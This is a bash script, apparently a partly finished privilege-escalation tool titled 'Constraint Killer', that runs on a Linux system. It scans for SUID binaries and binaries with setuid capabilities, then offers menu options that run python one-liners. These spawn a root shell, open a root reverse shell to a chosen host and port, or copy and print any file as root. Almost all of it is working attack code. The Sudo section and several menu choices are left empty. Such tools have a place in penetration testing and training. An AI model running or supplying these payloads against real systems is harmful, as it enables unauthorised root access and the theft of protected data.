#!/bin/bash
cat << 'EOF'                                                  
                            .,:                   
                        .l0WMMMd                  
                       xMMMMMMMW                  
      ....           l:..cOWMWWW       '::       
     cMMMMMMMMMMM0. 0MMMKo  ....   ,xXMMMM'      
    xMMMMMMMMMMMO .XMMMMN, cXMMMNd .WMMMMMd      
   OMMMMMMMMMMMo ;WMMMMN. KMMMMMMMd ;0MMMMd      
   .;oONMMMMMM: oMMMMMM, 0MMMMMMMM, :. ;xX'      
        .;oOX' kMMMMMMN 'MMMMMMMW: oMMNx;        
             .KMMMMMMMN ,MMMMMWd..OMMMMMl        
             cXMMMMMMMM: l00d; .xWMMMMW, :       
              ..:kNMMMM0 .;;cxXMMMMMMN. OMK.     
           ,xNMXd, .l0x ,WMMMMMMMMMMK..XMMMW;    
         .KMMMMMMMN     dXMMMMMMMMMk 'NMMMMMMo                    
        ;, 'oKMMMMX      ..cOWMMMMl :MMMMMMMMM0  
       dMl .c .:kN;   c0MMKo' 'oK;  xWMMMMMMMMMx 
      0W; ;WO  o'   ,NMMMMMMMo        :OMMMMMMd  
    .XN. oMo .XX.  :. ,dXMMMMc          .lXMMc   
   ,W0  kW: ,W0  .0W, ;: .cON              .'    
  cMx .KN' cMx  .NX. oMo .o.                      
 .Ml ,NK. dMl  ,WO  xM: ,W0                       
 ., cMk  OW,  lMd  0W' :Mx          Just Elevate These Privileges Already ! Constraint Killer              
   ,kc  ok.  ,kc  dk. .kl                              

████████████████████████████████████████████████████████████████████████████████████████████████████████

       █████ ██████████ ███████████ ███████████    █████████     █████████  █████   ████    ███ ███ ███
      ░░███ ░░███░░░░░█░█░░░███░░░█░░███░░░░░███  ███░░░░░███   ███░░░░░███░░███   ███░    ░███░███░███
       ░███  ░███  █ ░ ░   ░███  ░  ░███    ░███ ░███    ░███  ███     ░░░  ░███  ███      ░███░███░███
       ░███  ░██████       ░███     ░██████████  ░███████████ ░███          ░███████       ░███░███░███
       ░███  ░███░░█       ░███     ░███░░░░░░   ░███░░░░░███ ░███          ░███░░███      ░███░███░███
 ███   ░███  ░███ ░   █    ░███     ░███         ░███    ░███ ░░███     ███ ░███ ░░███     ░░░ ░░░ ░░░ 
░░████████   ██████████    █████    █████        █████   █████ ░░█████████  █████ ░░████    ███ ███ ███
 ░░░░░░░░   ░░░░░░░░░░    ░░░░░    ░░░░░        ░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░    ░░░ ░░░ ░░░ 
EOF
echo " "
echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
                                                                                                          

cat << 'EOF'

▄█████  ▄▄▄  ▄▄▄▄   ▄▄▄  ▄▄▄▄  ▄▄ ▄▄    ▄▄ ▄▄▄▄▄▄ ▄▄ ▄▄▄▄▄  ▄▄▄▄ 
██     ██▀██ ██▄█▀ ██▀██ ██▄██ ██ ██    ██   ██   ██ ██▄▄  ███▄▄ 
▀█████ ██▀██ ██    ██▀██ ██▄█▀ ██ ██▄▄▄ ██   ██   ██ ██▄▄▄ ▄▄██▀ 
 
EOF

echo "Shell (CAP_SETUID Capability) : "
ShellCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/ShellCap.txt; done)
echo "$ShellCap"
echo " "

echo "Reverse Shell (CAP_SETUID Capability) : "
RevShellCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/RevShellCap.txt; done)
echo "$RevShellCap"
echo " "

echo "File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) : "
FileReadCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid|cap_dac_override/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/ShellSUID.txt; done)
echo "$FileReadCap"
echo " "

echo "File Write (CAP_SETUID Capability) : "
FileWriteCap=$(getcap -r / 2>/dev/null | awk '$0 ~ /cap_setuid/ {print $1}' | while read -r p; do b="${p##*/}"; while IFS= read -r n; do [[ "$b" =~ $n ]] && echo "$p" && break; done < ./Dependencies/FileWriteCap.txt; done)
echo "$FileWriteCap"
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"

cat << 'EOF'

▄█████ ▄▄ ▄▄ ▄▄▄▄   ▄▄▄  
▀▀▀▄▄▄ ██ ██ ██▀██ ██▀██ 
█████▀ ▀███▀ ████▀ ▀███▀ 

EOF

echo "Shell (Sudo) : "
echo " "

echo "Reverse Shell (Sudo) : "
echo " "

echo "File Write (Sudo) : "
echo " "

echo "File Read (Sudo) : "
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"

cat << 'EOF'

▄█████ ▄▄ ▄▄ ▄▄ ▄▄▄▄  
▀▀▀▄▄▄ ██ ██ ██ ██▀██ 
█████▀ ▀███▀ ██ ████▀  

EOF

echo "Shell (SUID) : "
ShellSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/ShellSUID.txt) | cut -d' ' -f2-)
echo "$ShellSUID"
echo " "

echo "Reverse Shell (SUID) : "
RevShellSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/RevShellSUID.txt) | cut -d' ' -f2-)
echo "$RevShellSUID"
echo " "

echo "File Write (SUID) : "
FileWriteSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/FileWriteSUID.txt) | cut -d' ' -f2-)
echo "$FileWriteSUID"
echo " "

echo "File Read (SUID) : "
FileReadSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/FileReadSUID.txt) | cut -d' ' -f2-)
echo "$FileReadSUID"
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

while true; do
    echo "Techniques : "
    echo " "
    echo "Capabilities : "
    echo " "
    echo "1) Shell (CAP_SETUID Capability)"
    echo "2) Reverse Shell (CAP_SETUID Capability)"
    echo "3) File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities)"
    echo "4) File Write (CAP_SETUID Capability)"
    echo " "
    echo "Sudo : "
    echo " "
    echo "5) "
    echo "6) "
    echo "7) "
    echo "8) "
    echo " "
    echo "SUID : "
    echo " "
    echo "9) Shell (SUID)"
    echo "10) Reverse Shell (SUID)"
    echo "11) File Write (SUID)"
    echo "12) File Read (SUID)"
    echo " "
    echo "13) Quit"
    echo " "    
    read -p "Technique Choice : " choix
    
    echo " "
 
    case "$choix" in            
        1)
            echo "----- < Shell (CAP_SETUID Capability) > -----"
            echo " "
            if [ -z "$ShellCap" ]; then
                echo "No Vulnerables Binaries with Capabilities detected"
                continue
            else
                echo "Availables Binaries to Exploit : "
                echo " "
                echo "$ShellCap"
                echo " "
            fi

            select choice in $ShellCap "Go Back"; do
                case "$choice" in
                    *python*)
                        echo "Trying with python3"
                        "$choice" -c 'import os; os.setuid(0); os.system("bash")'
                        ;;
                    "Go Back")
                        break
                        ;;
                    *)
                        echo "Invalid Choice, Choose From : "
                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
                        ;;
                esac
            done               
            ;;
        2)
            echo "----- < Reverse Shell (CAP_SETUID Capability) > -----"
            echo " "
            read -p "Local Host for receiving the Reverse Shell : " LHOST
            read -p "Local Port for receiving the Reverse Shell : " LPORT
            if [ -z "$RevShellCap" ]; then
                echo "No Vulnerables Binaries with Capabilities detected"
                continue
            else
                echo "Availables Binaries to Exploit : "
                echo " "
                echo "$RevShellCap"
                echo " "
            fi

            select choice in $RevShellCap "Go Back"; do
                case "$choice" in
                    *python*)
                        read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
                        "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
                        ;;
                    "Go Back")
                        break
                        ;;
                    *)
                        echo "Invalid Choice, Choose From : "
                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
                        ;;
                esac
            done               
            ;;

        3)
            echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
            echo " "
            if [ -z "$FileReadCap" ]; then
                echo "No Vulnerables Binaries with Capabilities detected"
                continue
            else
                echo "Availables Binaries to Exploit : "
                echo " "
                echo "$FileReadCap"
                echo " "
            fi

            select choice in $FileReadCap "Go Back"; do
                case "$choice" in
                    *python*)
                        read -p "What file do you want to read ? : " FILE
                        echo "Trying with python3..."
                        echo "Result : "
                        echo " "
                        "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
                        
                        read -p "Do you want to read another file? [y/N] : " answer

                        if [[ "$answer" =~ ^[Yy]$ ]]; then
                            echo "Availables Binaries to Exploit : "
                            echo " "
                            echo "$choice"
                            echo " "
                            continue
                        else
                            break
                        fi
                        ;;
                    
                    "Go Back")
                        break
                        ;;
                    *)
                        echo "Invalid Choice, Choose From : "
                        printf '%s\n' "$FileReadCap" | nl -w2 -s') '
                        ;;
                esac
            done               
            ;;











            
        *)
            echo "Invalid Choice, Restart"
            echo " "
            ;;
    esac
done
